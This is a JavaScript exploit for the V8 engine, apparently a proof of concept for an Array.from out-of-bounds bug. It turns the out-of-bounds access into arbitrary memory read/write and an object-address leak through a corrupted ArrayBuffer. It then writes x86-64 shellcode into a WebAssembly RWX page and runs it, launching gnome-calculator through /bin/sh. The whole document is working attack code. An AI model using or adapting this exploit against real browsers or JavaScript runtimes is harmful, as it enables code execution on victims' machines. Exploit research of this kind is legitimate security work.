class typeConvert
{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    f2u(val){        //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){        //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var tC = new typeConvert();

function hex(x)
{
   return '0x' + (x.toString(16)).padStart(16, 0);
}


let oobArray = [1.1];  //float
let arrays=[];	
let objs=[];		//for leak							
let maxSize = 1028 * 8;			//8224

Array.from.call(function() { return oobArray }, {[Symbol.iterator] : x => (
    {
        counter : 0,
        next() {
        let result = 1.1;
        this.counter++;
        if (this.counter > maxSize) {
            oobArray.length = 1;
            for(let i=0;i<100;i++)
			{	
				let array=new ArrayBuffer(0xabcd);
				let obj={'a':0x1234,'b':0x5678};
				arrays.push(array);
				//%DebugPrint(array);
				objs.push(obj);
			}		
			return {done: true};
        } else {
            return {value: result, done: false};
        }
        }
    }
) });
//readline();

for(let i=0; i<=maxSize; i++) {let x = oobArray[i]}; //trigger the GC


let backing_store;
//let kbitfield;
let controllable_buf_index;
for(let i=0;i<maxSize;i++){
	let val = tC.f2u(oobArray[i]);
	if(val===0xabcd00000000){
		backing_store = i + 1;
		//kbitfield=backing_store+1;
		console.log("[*] find target ArrayBuffer length in oobArray number ["+i+"]");
		oobArray[i] = tC.u2f(0xbeef00000000);
		//oobArray[i+3] = tC.u2f(0xbeef);
		break;
	}
}
//console.log(hex(tC.f2u(oobArray[9])));
for(let i=0; i<arrays.length; i++){
	//console.log(arrays[i].byteLength);
	let val = arrays[i].byteLength;
	if(val === 0xbeef ){
		console.log("[*] find target ArrayBuffer number ["+i+"]");
		controllable_buf_index=i;
		break;
	}
}

let controllable_obj_index;
let obj_offset;

for(let i=0;i<maxSize; i++){
	let val = tC.f2u(oobArray[i]);
	if(val===0x123400000000){
		obj_offset = i;
		console.log("[*] find target objecets.a's value in oobArray number ["+i+"]");
		oobArray[i] = tC.u2f(0xaaaa00000000);
		break
	}
}

for(let i=0;i<objs.length;i++){
	let val = objs[i].a;
	if(val===0xaaaa){
		console.log("[*] find target objs number ["+i+"]");
		controllable_obj_index = i;
		break;
	}
}

class ArbitraryRW
{
	leakObj(obj){
		objs[controllable_obj_index].a = obj;
		return tC.f2u(oobArray[obj_offset]) - 0x1;
	}
	read(addr){
		oobArray[backing_store] = tC.u2f(addr);
		//oobArray[kbitfield] = tC.u2f(addr);
		let tmp = new Float64Array(arrays[controllable_buf_index],0,0x10);
		return tC.f2u(tmp[0]);
	}
	write(addr,val){
		oobArray[backing_store] = tC.u2f(addr);
		//oobArray[kbitfield] = tC.u2f(addr);
		let tmp = new Float64Array(arrays[controllable_buf_index],0,0x10);
		tmp[0] = tC.u2f(val);	
	}
}
let wr=new ArbitraryRW();

//let wr = new ArbitraryRW();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let f=wasmInstance.exports.main;
//%DebugPrint(f);

let asm_addr=wr.leakObj(f);
console.log("[*] address of asm = "+hex(asm_addr));
let sharedInfo =wr.read(asm_addr+0x18)-1;
let functionData=wr.read(sharedInfo+0x8)-1;
let instanceAddr=parseInt(wr.read(functionData+0x70)/0x10000);
console.log("[*] sharedInfo addresss ="+hex(sharedInfo));
console.log("[*] functionData addresss ="+hex(functionData));
console.log("[*] RWX address ="+hex(instanceAddr));
//readline();
let sc=[0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x1c,0x00,0x00,0x00,0x44,0x49,0x53,0x50,0x4c,0x41,0x59,0x3d,0x3a,0x30,0x20,0x67,0x6e,0x6f,0x6d,0x65,0x2d,0x63,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05];
for(let i=0;i<sc.length;i++){
    wr.write(instanceAddr+i,sc[i]);
}
f();

/*
*/
